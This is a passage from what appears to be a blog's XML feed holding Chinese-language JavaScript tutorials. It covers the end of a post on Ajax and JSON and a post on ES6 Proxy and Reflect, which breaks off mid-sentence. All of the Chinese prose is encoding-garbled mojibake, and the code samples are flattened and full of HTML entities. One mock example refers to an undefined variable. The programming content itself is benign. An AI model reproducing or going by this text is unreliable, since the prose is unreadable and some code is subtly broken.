éåŒæ­¥è™•ç†ï¼ˆAjaxï¼‰å‚³çµ±ä¸Šæˆ‘å€‘æœƒä½¿ç”¨ &lt;form&gt; è¡¨å–®å’Œå¾Œç«¯ç¨‹å¼ä½œäº’å‹•ï¼Œç„¶è€Œæ¯æ¬¡æäº¤è¡¨å–®é€å‡ºè«‹æ±‚çµ¦ä¼ºæœå™¨ï¼Œä¼ºæœå™¨æ¥æ”¶ä¸¦è™•ç†å‚³ä¾†çš„è¡¨å–®ï¼Œç„¶å¾Œé€å›ä¸€å€‹æ–°çš„ç¶²é ã€‚ä½¿ç”¨ Ajax æ‡‰ç”¨å¯ä»¥åƒ…å‘ä¼ºæœå™¨ç™¼é€ä¸¦å–å›å¿…é ˆçš„æ•¸æ“šï¼Œä¸¦åœ¨å®¢æˆ¶ç«¯æ¡ç”¨JavaScript è™•ç†ä¾†è‡ªä¼ºæœå™¨çš„å›æ‡‰ï¼Œä¸åƒ…æ¸›å°‘ä¼ºæœå™¨è² æ“”ä¹ŸåŠ å¿«åæ‡‰é€Ÿåº¦
åŒæ­¥ vs. éåŒæ­¥
ä¾åºåŸ·è¡Œï¼Œç­‰åˆ°ä¸Šä¸€å€‹å‡½æ•¸ä»»å‹™åŸ·è¡Œå®Œæ‰èƒ½åŸ·è¡Œä¸‹ä¸€å€‹

ä¸æœƒå› ç‚ºä¸Šä¸€å€‹å‡½æ•¸å°šæœªåŸ·è¡Œå®Œï¼ˆä¾‹å¦‚ï¼šå›å‚³çµæœï¼‰å°±å¡ä½ï¼Œæœƒå¾€ä¸‹åŸ·è¡Œä¸‹ä¸€å€‹ä»»å‹™
ä»€éº¼æ˜¯åŒæ­¥&#x2F;éåŒæ­¥ï¼Ÿ
éåŒæ­¥ä¿‚æŒ‡ç¨‹å¼ä¸æœƒå› ç‚ºä¸Šä¸€å€‹å‡½æ•¸å°šæœªåŸ·è¡Œå®Œï¼ˆä¾‹å¦‚ï¼šå›å‚³çµæœï¼‰å°±å¡ä½ï¼Œæœƒå¾€ä¸‹åŸ·è¡Œä¸‹ä¸€å€‹ä»»å‹™

åŒæ­¥å°±æ˜¯è¦ç­‰åˆ°ä¸Šä¸€å€‹å‡½æ•¸ä»»å‹™åŸ·è¡Œå®Œæ‰èƒ½åŸ·è¡Œä¸‹ä¸€å€‹ï¼Œæ˜¯ä¾åºåŸ·è¡Œ


ç”±æ–¼ DOM äº‹ä»¶è™•ç† å’Œ Ajax å‘¼å«æ˜¯éåŒæ­¥è™•ç†ï¼Œæ‰€ä»¥å¤§éƒ¨åˆ†äººæœƒç‚º JavaScript è²¼ä¸ŠéåŒæ­¥ç¨‹å¼è¨­è¨ˆçš„æ¨™ç±¤
ä»€éº¼æ˜¯ Ajaxï¼Ÿ
Ajax å…¨åï¼šAsynchronous Javascript And XMLï¼ŒæŒ‡çš„æ˜¯ä¸€å¥—ç¶œåˆäº†å¤šé …æŠ€è¡“çš„ç€è¦½å™¨ç«¯ç¶²é é–‹ç™¼æŠ€è¡“

é›–ç„¶ Ajax ä¸­ä½¿ç”¨ XML ç‚ºåï¼Œä¸é Ajax ä¸æ˜¯æŒ‡ä¸€ç¨®å–®ä¸€çš„æŠ€è¡“ã€‚ç¾åœ¨è¨±å¤šæ‡‰ç”¨éƒ½ä½¿ç”¨æ›´è¼•é‡çš„ JSON é€²è¡Œè³‡æ–™å‚³è¼¸

å¯ä»¥å®Œæˆä¸åˆ·é å±€éƒ¨æ›´æ–°æ‡‰ç”¨ï¼Œä½¿ç”¨è€…é«”é©—è¼ƒå¥½ã€‚ä¸éè¦å°å¿ƒå›èª¿åœ°ç„ï¼ˆcallback hellï¼‰


ç°¡æ˜“ Ajax å¯¦ä½œ// è‹¥éœ€è¦æ”¯æ´è·¨ç€è¦½å™¨ï¼Œé‚„éœ€è¦é¡å¤–æª¢é©—if (typeof XMLHttpRequest != &#x27;undefined&#x27;) &#123;    // ä¸€èˆ¬ä½¿ç”¨ XMLHttpRequest ç‰©ä»¶    const xhr = new XMLHttpRequest();    const REQUEST_URL = &#x27;http://163.29.157.32:8080/dataset/6a3e862a-e1cb-4e44-b989-d35609559463/resource/f4a75ba9-7721-4363-884d-c3820b0b917c/download/393625397fc043188a3f8237c1da1c6f.json&#x27;;    // ç›£è½æ˜¯å¦å®Œæˆ    xhr.onreadystatechange = function() &#123;        if (xhr.readyState === XMLHttpRequest.DONE) &#123;            console.log(xhr.responseText);        &#125;    &#125;        xhr.open(&#x27;GET&#x27;, REQUEST_URL);    xhr.send();&#125; 

JSON åŸºç¤æ¦‚å¿µ
JSONï¼ˆJavaScript Object Notationï¼‰æ˜¯ä¸€ç¨®ç”±Douglas Crockford æ§‹æƒ³è¨­è¨ˆã€è¼•é‡ç´šçš„è³‡æ–™äº¤æ›èªè¨€ï¼Œä»¥æ–‡å­—ç‚ºåŸºç¤ï¼Œä¸”æ˜“æ–¼è®“äººé–±è®€

JSON é›–ç„¶èµ·æ–¼ JavaScriptï¼Œä½†è³‡æ–™æ ¼å¼èˆ‡èªè¨€ç„¡é—œï¼Œç›®å‰å¾ˆå¤šç¨‹å¼èªè¨€éƒ½æ”¯æ´ JSON æ ¼å¼è³‡æ–™çš„ç”Ÿæˆå’Œè§£æ

JSON çš„å®˜æ–¹ MIME é¡å‹æ˜¯ application/jsonï¼Œå…¶å‰¯æª”åæ˜¯ .json

åŸºæœ¬æ ¼å¼ &#123; &quot;key&quot;: &quot;value&quot; &#125;ã€&#123; &quot;key&quot;: [&quot;value1&quot;, &quot;value2&quot;] &#125;



JSON é•·é€™æ¨£&#123;     &quot;name&quot;: &quot;John Smith&quot;,     &quot;address&quot;:      &#123;         &quot;streetAddress&quot;: &quot;21 2nd Street&quot;,         &quot;city&quot;: &quot;New York&quot;,         &quot;state&quot;: &quot;NY&quot;,         &quot;postalCode&quot;: &quot;10021&quot;     &#125;,     &quot;phoneNumber&quot;:      [         &#123;           &quot;type&quot;: &quot;home&quot;,           &quot;number&quot;: &quot;212 555-1234&quot;         &#125;,         &#123;           &quot;type&quot;: &quot;fax&quot;,           &quot;number&quot;: &quot;646 555-4567&quot;         &#125;     ] &#125;

ç¸½çµä»¥ä¸Šä»‹ç´¹äº†æ–°æ‰‹ä¸Šè·¯ JavaScript å…¥é–€æ ¸å¿ƒåŸºç¤æ¦‚å¿µï¼Œå¤§å®¶å¯ä»¥å–„ç”¨ JSBin å¯¦éš›å‹•æ‰‹æ“ä½œï¼Œä¸¦åƒè€ƒ MDN æˆ– W3CSchool çš„æ¡ˆä¾‹æœƒæ›´æ¸…æ¥šæ•´é«”è§€å¿µå–”ï¼
å»¶ä¼¸é–±è®€
ç”¨ååˆ†é˜ç­è§£ é™³é¾èª çš„ç¨‹å¼è¨­è¨ˆèª² (æ¡ç”¨JavaScript + Cçš„åŸå› )
You-Dont-Know-JS
JavaScriptèˆ‡å‰ç«¯ç¨‹å¼è¨­è¨ˆå…¥é–€è‡ªå­¸åƒè€ƒ
JavaScript Garden  
JavaScriptæ ¸å¿ƒ
[ç¨€åœŸæ˜é‡‘æ—¥æŠ¥] JavaScript å¼€å‘è€…å¿…å¤‡çš„èµ„æºåˆé›†
å°ˆç‚ºä¸­å­¸ç”Ÿå¯«çš„ JavaScript ç¨‹å¼æ›¸ 
nzakas&#x2F;computer-science-in-javascript
é‡æ–°ä»‹ç´¹ JavaScript

ï¼ˆimage via mprã€mahmoudzaltï¼‰
é—œæ–¼ä½œè€…ï¼š@kdchang æ–‡è—å‹é–‹ç™¼è€…ï¼Œå¤¢æƒ³æ˜¯åšå‡ºäººå€‘æƒ³ç”¨çš„ç”¢å“å’Œè¾¦ä¸€æ‰€å¿ƒç›®ä¸­ç†æƒ³çš„å­¸æ ¡ã€‚A Starter &amp; Maker. JavaScript, Python &amp; Arduino&#x2F;Android lover.:) 
]]></content>
      <tags>
        <tag>JavaScript</tag>
        <tag>ECMAScript2015</tag>
        <tag>ES6</tag>
        <tag>Front End</tag>
        <tag>Front End Development Environment</tag>
      </tags>
  </entry>
  <entry>
    <title>ä¸€èµ·ä¾†äº†è§£ Javascript ä¸­çš„ Proxy èˆ‡ Reflect</title>
    <url>/2018/05/27/js-proxy-reflect/</url>
    <content><![CDATA[å‰è¨€åœ¨çœ¾å¤š ES6 æä¾›çš„æ–°åŠŸèƒ½ä¸Šï¼ŒProxy èˆ‡ Reflect ç®—æ˜¯æœ€å°‘è¢«æåŠçš„ï¼Œä¸»è¦åŸå› æˆ‘æƒ³é‚„æ˜¯å› ç‚ºç€è¦½å™¨çš„æ”¯æ´åº¦è¼ƒä½ï¼Œä¸éåœ¨æˆ‘å‰é™£å­çœ‹åˆ° Frameworkless JavaScript Part 3: One-Way Data Binding é€™ç¯‡æ–‡ç« æ™‚ï¼ˆå¥½æ–‡æ¨è–¦ï¼å¾ˆæœ‰è¶£ï¼‰ï¼Œç‰¹æ„å»æŸ¥äº†ä¸€ä¸‹æ‰ç™¼ç¾ç›®å‰æ”¯æ´åº¦å·²ç¶“è¶Šä¾†è¶Šå¥½ï¼š


å¸¸ç”¨çš„ç€è¦½å™¨å¹¾ä¹éƒ½æ”¯æ´ï¼Œæˆ‘æƒ³ä¹Ÿæ˜¯å¯ä»¥ä¾†å¥½å¥½äº†è§£ä¸€ä¸‹é€™å…©å€‹ç¥å¥‡çš„ç‰©ä»¶äº†ï¼
æœ€å¾Œæœ‰å€‹åƒè€ƒè©²ç¯‡æ–‡ç« å¯¦ä½œçš„ Todo app ç¯„ä¾‹ï¼Œå¦‚æœæ‡¶å¾—çœ‹ä»‹ç´¹çš„å¯ä»¥å…ˆ è·³ä¸‹å» ç©ç©ï¼Œä½†è‹¥æ˜¯å° Proxy èˆ‡ Reflect ä¸äº†è§£çš„äººé‚„æ˜¯å»ºè­°å…ˆçœ‹ä¸€ä¸‹ã€‚
Proxy
Proxy ç‰©ä»¶è¢«ä½¿ç”¨æ–¼å®šç¾©åŸºæœ¬æ“ä½œçš„è‡ªå®šè¡Œç‚ºï¼ˆä¾‹å¦‚ï¼šå°‹æ‰¾å±¬æ€§ã€è³¦å€¼ã€åˆ—èˆ‰ã€å‡½å¼èª¿ç”¨ç­‰ç­‰ï¼‰ã€‚ - MDN

ä¸çŸ¥é“ç‚ºä»€éº¼å”¸èµ·ä¾†æœ‰é»é¥’å£ï¼Œä½†åŸºæœ¬ä¸Šè·Ÿå…¶å­—é¢æ„æ€ç›¸åŒï¼Œå°±æ˜¯ä»£ç†ï¼ˆä»£ç‚ºç®¡ç†ï¼‰ç‰©ä»¶è¡Œç‚ºã€‚
Proxy æ˜¯ä¸€å€‹å‡½å¼ç‰©ä»¶ï¼ˆå¯è¢«å»ºæ§‹ï¼‰ï¼Œä»–æä¾›ä¸€å€‹æ©Ÿæœƒè®“ä½ èƒ½ä»‹å…¥ä¸€èˆ¬ç‰©ä»¶çš„åŸºæœ¬æ“ä½œè¡Œç‚ºï¼Œåƒæ˜¯åœ¨ä½  assign ä¸€å€‹å€¼çµ¦æŸå€‹ç‰©ä»¶æ™‚ï¼Œå¯ä»¥é€é Proxy å…ˆé€²è¡Œä¸€äº› validation ç­‰ç­‰ï¼Œè—‰æ­¤è®“ä½¿ç”¨è¢«ä»£ç†éå¾Œçš„ç‰©ä»¶ä¹‹é–‹ç™¼è€…å¯ä»¥å°ˆæ³¨åœ¨å…¶ä»–æ ¸å¿ƒåŠŸèƒ½ä¸Šã€‚
å’¦ï¼Ÿè½èµ·ä¾†å¾ˆåƒè¨±å¤š framework æˆ– helper library æœƒåšçš„äº‹æƒ…ï¼Ÿæœ‰è¶£ï¼è®“æˆ‘å€‘ç¹¼çºŒçœ‹ä¸‹å»ã€‚
ä½¿ç”¨æ–¹æ³•å¦‚ä¸‹ï¼š
const proxyObj = new Proxy(target, handler);

target å°±æ˜¯ä½ æƒ³è¦ä»£ç†çš„å°è±¡ï¼›è€Œ handler å‰‡æ˜¯ä¸€å€‹ç‰©ä»¶ï¼Œå…¶ä¸­å®šç¾©äº†æ‰€æœ‰ä½ æƒ³æ›¿ target ä»£ç‚ºç®¡ç†çš„æ“ä½œå®šç¾©ï¼ŒåŒ…å«äº†ï¼š

construct(target, args) - ä»£ç† Object çš„ new operator

get(target, prop, receiver) - ä»£ç† Object getting properties æ™‚çš„è¡Œç‚º

set(target, prop, value, receiver) - ä»£ç† Object setting properties æ™‚çš„è¡Œç‚º

apply(target, object, args) - ä»£ç† function callï¼Œåƒæ˜¯ f.apply()

has(target, prop) - ä»£ç† in operator

defineProperty(target, propKey, propDesc) - ä»£ç† Object.defineProperty.

deleteProperty(target, prop) - ä»£ç† delete operator

getOwnPropertyDescriptor(target, prop) - ä»£ç† Object.getOwnPropertyDescriptor.

getPrototypeOf(target) - ä»£ç† Object.getPrototypeOf.

setPrototypeOf(target, proto) - ä»£ç† Object.setPrototypeOf.

ownKeys(target) - ä»£ç† Object.getOwnPropertyNames èˆ‡ Object.getOwnPropertySymbols.

isExtensible(target) - ä»£ç† Object.isExtensible.

preventExtensions(target) - ä»£ç† Object.preventExtensions.


handler object æ‰€åŒ…å«çš„ method å®šç¾©å¯ä»¥å¾ MDN çœ‹åˆ°æ›´å¤šç¯„ä¾‹èˆ‡æè¿°ã€‚
èªªäº†é€™éº¼å¤šï¼Œæˆ‘å€‘åˆ°åº•èƒ½æ‹¿ Proxy ä¾†åšä»€éº¼å‘¢ï¼Ÿç›´æ¥ä¾†é»ç¯„ä¾‹å§ï¼ç›´è§€çš„ç§æœ‰è®Šæ•¸ä»¥å¾€åœ¨ Javascript ä¸­ï¼Œæˆ‘å€‘å¯èƒ½éœ€è¦é€é closure ä¾†å¯¦ç¾ç‰©ä»¶çš„ç§æœ‰è®Šæ•¸ï¼Œåƒæ˜¯ï¼š
const FooBar = function() &#123;  this.closeTime = &#x27;never&#x27;;  this.setSecretDrink = (secret) =&gt; &#123; secretDrink = secret; &#125;  this.getSecretDrink = () =&gt; &#123; return secretDrink; &#125;&#125;const fooBar = new FooBar();fooBar.setSecretDrink(&#x27;JÃ¤ger Bom&#x27;);console.log(fooBar.getSecretDrink()); // &#x27;JÃ¤ger Bom&#x27;console.log(fooBar.closeTime); // neverconsole.log(fooBar.secretDrink); // undefined

ä½†é€é Proxyï¼Œæˆ‘å€‘å¯ä»¥å¾ˆç›´è§€åœ°åœ¨ä¸€å€‹ Object å…§é”æˆé¡ä¼¼æ•ˆæœï¼š
let FooBar = &#123;  _secretDrink: &#x27;JÃ¤ger Bom&#x27;,  closeTime: &#x27;never&#x27;&#125;;FooBarProxy = new Proxy(FooBar, &#123;  get: function(target, prop) &#123;    // ä»¥åº•ç·šé–‹é ­çš„ä½œç‚ºç§æœ‰è®Šæ•¸    if (prop.startsWith(&#x27;_&#x27;)) &#123;      console.log(&#x27;ä¸èƒ½å­˜å–ç§æœ‰è®Šæ•¸ï¼&#x27;);      return false;    &#125;    return target[prop]; // éç§æœ‰è®Šæ•¸ï¼Œé‚£å°±å›å‚³åŸç‰©ä»¶çš„åŸå±¬æ€§å€¼  &#125;,  set: function(target, prop, value) &#123;    if (prop.startsWith(&#x27;_&#x27;)) &#123;      console.log(&#x27;ä¸èƒ½ä¿®æ”¹ç§æœ‰è®Šæ•¸ï¼&#x27;);      return false;    &#125;    target[prop] = value;  &#125;,  has: function(target, prop) &#123;    return prop.startsWith(&#x27;_&#x27;) ? false : (prop in target);  &#125;&#125;);FooBarProxy._secretDrink; // ä¸èƒ½å­˜å–ç§æœ‰è®Šæ•¸ï¼console.log(FooBarProxy.closeTime); // neverFooBarProxy._secretDrink = &#x27;Cola&#x27;; // ä¸èƒ½ä¿®æ”¹ç§æœ‰è®Šæ•¸ï¼console.log(&#x27;_secretDrink&#x27; in FooBarProxy); // falseconsole.log(&#x27;closeTime&#x27; in FooBarProxy); // true

çœ¼å°–ä¸€é»çš„è®€è€…å¯èƒ½æœƒç™¼ç¾ï¼Œé€™é‚Š handler è£¡é¢çš„ getã€set å¥½åƒè·Ÿä¸Šé¢å®šç¾©ä¸­çš„åƒæ•¸ä¸åŒï¼Œå°‘äº† receiver é€™å€‹åƒæ•¸ï¼Ÿ
æ²’éŒ¯ï¼Œé€™å€‹ç¥å¥‡çš„ç¬¬ä¸‰å€‹åƒæ•¸å…¶å¯¦æ˜¯æŒ‡å‘ä½ ç”¢ç”Ÿçš„ Proxy å¯¦ä¾‹ï¼Œä»¥ä¸Šé¢ä¾‹å­ä¾†çœ‹å°±æ˜¯ FooBarProxy æœ¬èº«ï¼Œç”±æ–¼ç¯„ä¾‹ä¸­ç”¨ä¸åˆ°ï¼Œæ‰€ä»¥ä¸å®£å‘Šä¹Ÿæ²’é—œä¿‚ï¼Œä¸éæ™šé»åœ¨ Reflect çš„ä»‹ç´¹æœƒå†åº¦æèµ·ã€‚
å¦å¤–ï¼Œè‹¥æ˜¯æ²’æœ‰è¢«ä½ ä»£ç†åˆ°çš„æ“ä½œï¼Œå‰‡æœƒç›´æ¥ fallback å›åŸå§‹ target ç‰©ä»¶çš„æ“ä½œä¸Šã€‚
åœ¨è¨­ç½®ç‰©ä»¶å±¬æ€§å‰é€²è¡Œ Validationå»¶çºŒå‰›å‰›çš„ä¾‹å­ï¼Œæˆ‘å€‘çš„ FooBar é™¤äº†ç§˜å¯†é£²æ–™å¤–ï¼Œä¹Ÿéœ€è¦ç´€éŒ„ä¸€ä¸‹åŸºæœ¬è³‡è¨Šï¼Œåƒæ˜¯é›»è©±ã€åœ°å€ç­‰ç­‰ï¼Œé€™æ™‚å€™ Proxy å°±èƒ½ç‚ºæˆ‘å€‘å¸¶ä¾†å¦ä¸€å€‹å¥½è™•ï¼šé©—è­‰å±¬æ€§å€¼ï¼š
let FooBar = &#123;  _secretDrink: &#x27;JÃ¤ger Bom&#x27;,  closeTime: &#x27;never&#x27;,  phoneNumber: &#x27;02-2849-2839&#x27;&#125;;FooBar = new Proxy(FooBar, &#123;  set: function(target, prop, value) &#123;    if (prop === &#x27;phoneNumber&#x27;) &#123;      // phone number validation      var re = /^\(?\d&#123;2&#125;\)?[\s\-]?\d&#123;4&#125;\-?\d&#123;4&#125;$/;      if (!re.test(value)) &#123;        throw Error(`Cannot set $&#123;prop&#125; to $&#123;value&#125;. Wrong format. Should be xx-xxxx-xxxx`);      &#125;    &#125;    target[prop] = value;  &#125;,  //..&#125;);


åªè¦ä½ è¨­ç½®çš„ phoneNumber ä¸ç¬¦åˆ regex çš„è¦å‰‡ï¼Œå°±æœƒæ‹‹å‡ºä¸€å€‹ Error å‘Šè¨´é–‹ç™¼è€…ï¼Œæ­¤ç‰©ä»¶çš„ phoneNumber å±¬æ€§å€¼æ˜¯æœ‰å›ºå®š format çš„ã€‚
ç•¶ç„¶ï¼Œjavascript å……æ»¿å½ˆæ€§ï¼Œä½ ä¹Ÿå¯ä»¥æœ‰å½ˆæ€§ä¸€é»çš„å¯«æ³•ï¼ŒæŠŠ validator æŠ½é›¢å‡ºä¾†ï¼š
var BarValidator = &#123;  _secretDrink: function (value) &#123;    if (value === &#x27;cola&#x27;) &#123;      throw Error(&#x27;lame...&#x27;);    &#125;  &#125;,  phoneNumber: function(value) &#123;    var re = /^\(?\d&#123;2&#125;\)?[\s\-]?\d&#123;4&#125;\-?\d&#123;4&#125;$/;    if (!re.test(value)) &#123;      throw Error(`Cannot set phoneNumber to $&#123;value&#125;. Wrong format. Should be xx-xxxx-xxxx`);    &#125;  &#125;&#125;;FooBar = new Proxy(FooBar, &#123;  set: function(target, prop, value) &#123;    BarValidator[prop](value);    target[prop] = value;  &#125;,  //..&#125;);

ç”¨ä¾†è¨­å®šå±¬æ€§é è¨­å€¼// å¯¦éš›ä¸Šæ²’æœ‰é€™å€‹å±¬æ€§console.log(FooBar.revenue); // undefined// ä½†ç¶“é Proxy å¾ŒFooBar = new Proxy(FooBar, &#123;  get: function(target, prop, value) &#123;    if(prop === &#x27;revenue&#x27;) &#123;      return &#x27;None of your business&#x27;;    &#125;    return target[prop];  &#125;,  //..&#125;);// å¯ä»¥è®€å–åˆ°æˆ‘å€‘è¨­å®šçš„é è¨­å€¼console.log(FooBar.revenue); // &#x27;None of your business&#x27;

è¤‡å¯«åŸæœ‰ç‰©ä»¶ï¼Œè®“æ¸¬è©¦æ›´åŠ é †åˆ©ï¼ˆmock objectï¼‰å¯«æ¸¬è©¦çš„æ™‚å€™å¾ˆå¸¸æœƒéœ€è¦ mock objectï¼Œåƒæ˜¯ function ä¸­è‹¥æœ‰è®€å– document.location.href çš„éƒ¨åˆ†ï¼Œåœ¨ä½ é–‹ç™¼æ©Ÿä¸ŠåŸºæœ¬ä¸Šéƒ½æœƒæ˜¯ localhostï¼Œé€™æ™‚å€™å°±æœƒéœ€è¦æŠŠé€™å€‹å€¼ mock æ‰ã€‚
é€™æ™‚æˆ‘å€‘å°±å¯ä»¥å°‡ document.location å§”è¨—çµ¦ proxy ä»£ç†ï¼š
const mockDocument = &#123;  location: new Proxy(document.location, &#123;      get: function(target, prop) &#123;          if (prop == &quot;href&quot;)              return &quot;your-website-com&quot;;          return target[prop];      &#125;  &#125;)&#125;;console.log(&quot;location href: &quot;, mockLocation.location.href); // https://blog.arvinh.info

çœ‹åˆ°é€™é‚Šæƒ³å¿…å¾ˆå¤šäººéƒ½æœƒæƒ³åˆ°ï¼Œæˆ‘å€‘å¯ä»¥å¯¦ä½œ Observe functionï¼function observe(o, callback) &#123;  return new Proxy(o, &#123;    set(target, property, value) &#123;      callback(property, value);      target[property] = value;    &#125;,  &#125;);&#125;const FooBar = &#123; open: false &#125;;const FooBarObserver = observe(FooBar, (property, value) =&gt; &#123;  property === &#x27;open&#x27; &amp;&amp; value ? alert(&#x27;FooBar is open!!!&#x27;) : console.log(&#x27;keep waiting&#x27;);&#125;);FooBarObserver.open = true;

ä¸æ˜¯ä»€éº¼éƒ½å¯ä»¥è¢«ä»£ç†çš„ä¸çŸ¥é“å¤§å®¶æœƒä¸æœƒæœ‰å€‹ç–‘å•ï¼Œé›£é“æ‰€æœ‰ç‰©ä»¶éƒ½èƒ½è¢« proxy ä»£ç†å—ï¼Ÿæœ‰æ²’æœ‰è¾¦æ³•é™åˆ¶æˆ‘çš„æŸå€‹ç‰©ä»¶å°±æ˜¯ä¸å¸Œæœ›è¢«ä»–äººä»£ç†ï¼Ÿ
ç•¶ç„¶æœ‰ï¼
å¦‚æœä½ çš„ç‰©ä»¶æ“æœ‰ configurable: false èˆ‡ writable: false çš„å±¬æ€§ï¼Œé‚£è©²ç‰©ä»¶å°±ç„¡æ³•è¢« proxy ä»£ç†ï¼š
const target = Object.defineProperties(&#123;&#125;, &#123;  FooBar: &#123;    writable: false,    configurable: false  &#125;,&#125;);const handler = &#123;  get(target, propKey) &#123;    return &#x27;???&#x27;;  &#125;&#125;;const proxy = new Proxy(target, handler);proxy.FooBar// Uncaught TypeError: &#x27;get&#x27; on proxy: property &#x27;FooBar&#x27; is a read-only and non-configurable data property on the proxy target but the proxy did not return its actual value (expected &#x27;undefined&#x27; but got &#x27;???&#x27;)

å°çµè«–é€™é‚Šæˆ‘åªåˆ—äº†å¹¾å€‹æˆ‘è¦ºå¾—æ¯”è¼ƒèƒ½å‡¸é¡¯ Proxy ç”¨é€”çš„ç¯„ä¾‹ï¼Œè€Œå…¶ä»– handler å¯ä»¥ä»‹å…¥çš„æ“ä½œå¦‚æœå¤§å®¶ä¹Ÿæƒ³äº†è§£ä¸¦çœ‹çœ‹ä¾‹å­çš„è©±ï¼Œé˜®ä¸€å³°çš„ ECMAScript 6 å…¥é–€ ä¸­æœ‰é‡å°æ¯å€‹æ“ä½œçµ¦äºˆä¾‹å­åšè§£æï¼Œå¯ä»¥åƒè€ƒã€‚
Reflectæ¥è‘—æˆ‘å€‘ä¾†çœ‹çœ‹ Reflectã€‚Reflect ä¸èƒ½å»ºæ§‹å¯¦ä¾‹ï¼Œå°±åƒ Math ä¸€æ¨£ï¼Œå–®ç´”åŒ…å«äº†ä¸€ç³»åˆ—çš„éœæ…‹æ–¹æ³•ã€‚
Reflect èˆ‡ Proxy çš„å®Œç¾æ­é…ç¶²è·¯ä¸Šè¨±å¤šæ–‡ç« éƒ½èªª Reflect æ˜¯å› æ‡‰ Proxy æ‰å¢åŠ çš„è¦ç¯„ï¼Œæœ€æ˜ç¢ºçš„é€£çµæ˜¯ï¼ŒReflect æ‰€å®šç¾©çš„éœæ…‹æ–¹æ³•åŒ…å«äº† Proxy Handler èƒ½è™•ç†çš„æ‰€æœ‰ä»£ç†æ“ä½œï¼Œä½†ä»–æä¾›çš„æ˜¯å‘¼å«åŸå§‹ç‰©ä»¶çš„æ“ä½œï¼Œèˆ‰ä¾‹ä¾†èªªï¼š
Reflect.get(target, name); æ•ˆæœç­‰åŒæ–¼ target[name];
æ‰€ä»¥æˆ‘å€‘åœ¨ Proxy ä¸­ï¼Œå¦‚æœéœ€è¦ target ç‰©ä»¶çš„é è¨­æ“ä½œï¼Œä½¿ç”¨ Reflect æœƒæ›´åˆç†æ›´æ¸…æ¥šï¼š
const loggedObj = new Proxy(obj, &#123;  get: function(target, name) &#123;    console.log(&quot;get&quot;, target, name);    return Reflect.get(target, name);  &#125;&#125;);

ä¸»è¦çš„ç†ç”±åœ¨æ–¼ï¼ŒReflect è®“æˆ‘å€‘å°ç‰©ä»¶çš„æ“ä½œå¯ä»¥ç”¨å‡½æ•¸ä¾†è™•ç†ä¾‹å¦‚åœ¨åˆ¤æ–·ç‰©ä»¶æœ‰ç„¡ç‰¹å®šå±¬æ€§ï¼Œæˆ–æ˜¯åˆªé™¤ç‰©ä»¶å±¬æ€§æ™‚ï¼Œä»¥å¾€æˆ‘å€‘æœƒé€™æ¨£åšï¼š
&#x27;_secretDrink&#x27; in FooBar;delete Object._secretDrink;

æœ‰äº† Reflect æˆ‘å€‘å¯ä»¥é€™æ¨£åšï¼š
Reflect.has(FooBar, &#x27;_secretDrink&#x27;);Reflect.deleteProperty(FooBar, &#x27;_secretDrink&#x27;);

å› æ­¤ï¼Œåœ¨ Proxy ä¸­ï¼Œæ¯”èµ·ä½¿ç”¨ delete target[name], Reflect.deleteProperty æ›´èƒ½ä¿æŒä¸€åˆ¶æ€§ï¼š
const loggedObj = new Proxy(obj, &#123;  deleteProperty: function(target, name) &#123;    // instead of `delete target[name]...    return Reflect.deleteProperty(target, name);  &#125;&#125;);

æ§åˆ¶è¢« Proxy ä»£ç†çš„å‡½æ•¸ä¹‹ this åƒè€ƒå°è±¡é€™å€‹ä¾‹å­æ¯”è¼ƒé›£æ‡‚ï¼Œä½†é€™æ˜¯èªªæ˜ç‚ºä½• Reflect æ˜¯å› æ‡‰ Proxy è€Œç”Ÿçš„å¥½ä¾‹å­(source)ï¼š
const target = &#123;    get foo() &#123;        return this.bar;    &#125;,    bar: 3&#125;;const handler = &#123;    get(target, propertyKey, receiver) &#123;        if (propertyKey === &#x27;bar&#x27;) return 2;        console.log(&#x27;Reflect.get &#x27;, Reflect.get(target, propertyKey, receiver)); // this in foo getter references Proxy instance; logs 2        console.log(&#x27;target[propertyKey] &#x27;, target[propertyKey]); // this in foo getter references &quot;target&quot; - logs 3    &#125;&#125;;const obj = new Proxy(target, handler);console.log(obj.bar);// 2obj.foo;// Reflect.get  2// target[propertyKey]  3
JS Bin on jsbin.com
å‡è¨­ä½ çš„ object target æœ‰ä¸€å€‹ getter å‡½æ•¸ foo()ï¼Œç¾åœ¨ä½ é€é Proxy ä»£ç† get å‡½æ•¸ï¼Œç•¶ä»Šå¤©ä½ å‘¼å« obj.bar æ™‚ï¼Œæœƒå°å‡º 2ï¼Œå› ç‚º Proxy handler æ””æˆªä¸¦ä»£ç†äº†åŸå§‹ target ç‰©ä»¶çš„ get å‡½æ•¸ï¼›æ¥è‘—ï¼Œè‹¥ä½ å‘¼å« obj.fooï¼Œæœƒå‡ºç¾å…©å€‹çµæœ: Reflect.get  2 èˆ‡ target[propertyKey]  3ã€‚
ç‚ºä»€éº¼ï¼Ÿ
é€™æ˜¯å› ç‚ºåªæœ‰é€é Reflect.get() çš„ç¬¬ä¸‰å€‹åƒæ•¸ receiverï¼Œå°‡æŒ‡å‘ Proxy æœ¬èº«çš„å¯¦ä¾‹å‚³é€²å»åŸå§‹ç‰©ä»¶çš„ get å‘¼å«ï¼Œæ‰èƒ½å¤ çœŸçš„å‘¼å«åˆ° Proxy.getã€‚
è‹¥æ˜¯ç›´æ¥é€é target[&#39;foo&#39;]ï¼Œå‰‡åŸæœ¬åœ¨ foo ä¸­çš„ thisï¼Œå°±æœƒæŒ‡å‘åŸå§‹çš„ target æœ¬èº«ï¼Œè€Œä¸æœƒè§¸ç™¼ Proxy çš„ getã€‚
é€™é‚Šæ¦‚å¿µçœŸçš„æ¯”è¼ƒé›£æ‡‚ï¼Œè‹¥æˆ‘æœ‰ä»»ä½•éŒ¯èª¤åœ°æ–¹æ­¡è¿æŒ‡æ­£ï¼Œæˆ‘ç›¸ä¿¡å¤§å®¶å¤šçœ‹å¹¾æ¬¡ç¯„ä¾‹å¾Œéƒ½èƒ½æ‚Ÿé“çš„ã€‚
é™¤äº†èˆ‡ Proxy åŒ¹é…çš„å„ªå‹¢å¤–ï¼ŒReflect é‚„å¸¶ä¾†äº†ä¸€äº›å¥½è™•ï¼ˆsource: Benefits of ES6 Reflect API, Harmony-reflect)ï¼š
